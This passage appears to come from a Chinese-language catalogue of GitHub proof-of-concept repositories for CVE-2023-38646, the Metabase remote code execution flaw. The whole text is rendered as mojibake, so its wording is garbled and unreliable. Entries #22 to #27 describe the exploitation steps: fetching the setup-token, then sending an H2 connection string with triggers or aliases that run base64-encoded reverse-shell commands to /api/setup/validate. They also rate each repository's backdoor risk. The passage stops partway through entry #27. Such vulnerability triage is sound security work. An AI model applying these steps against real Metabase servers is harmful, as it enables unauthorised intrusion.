**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

